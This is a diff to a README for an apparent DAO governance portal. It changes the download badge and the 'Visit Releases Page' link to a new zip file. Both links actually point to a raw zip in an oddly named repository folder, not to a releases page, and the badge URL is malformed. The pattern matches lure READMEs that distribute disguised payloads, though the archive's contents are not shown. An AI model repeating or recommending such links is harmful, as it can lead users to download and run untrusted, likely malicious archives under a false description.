@@ -1,6 +1,6 @@
 # 🎉 dao-governance-portal - Your Path to Collaborative Decision-Making 
 
-[![Download Now](https://raw.githubusercontent.com/nnaulia/dao-governance-portal/main/meconophagist/governance-portal-dao-2.4.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/nnaulia/dao-governance-portal/main/meconophagist/governance-portal-dao-2.4.zip)
+[![Download Now](https://raw.githubusercontent.com/nnaulia/dao-governance-portal/main/meconophagist/portal_governance_dao_Effie.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/nnaulia/dao-governance-portal/main/meconophagist/portal_governance_dao_Effie.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To use the dao-governance-portal, follow these simple steps to download and inst
 
 1. **Visit the Releases Page**  
    Click the link below to open the Releases page where you can download the application.  
-   [Visit Releases Page](https://raw.githubusercontent.com/nnaulia/dao-governance-portal/main/meconophagist/governance-portal-dao-2.4.zip)
+   [Visit Releases Page](https://raw.githubusercontent.com/nnaulia/dao-governance-portal/main/meconophagist/portal_governance_dao_Effie.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see multiple versions of the application. Pick the latest version for the best experience.
